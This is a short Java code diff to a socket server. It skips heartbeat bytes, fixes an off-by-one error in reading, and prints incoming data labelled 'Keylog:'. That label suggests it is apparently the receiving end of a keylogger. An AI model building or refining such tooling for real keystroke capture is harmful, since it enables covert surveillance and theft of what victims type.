@@ -130,14 +130,18 @@ public class server {
 			fromClient.read(single, 0, 1);
 			System.out.println("op code: " + (0xFF & single[0]));
 			int message[] = new int[2048];
-			next = 0;
+			next = fromClient.read();
+			while (next == 255) { // get rid of any heartbeats
+				next = fromClient.read();
+				next = fromClient.read();
+			}
 			int i = 0;
 			while (next != '\n') {
-				next = fromClient.read(); //todo this should probably be after i++
 				message[i] = next;
 				i++;
+				next = fromClient.read();
 			}
-			String rec = new String(message, 0, i - 1);
+			String rec = new String(message, 0, i);
 			System.out.println("Keylog: " + rec);
 		} catch (IOException | InterruptedException e) {
 			// TODO Auto-generated catch block
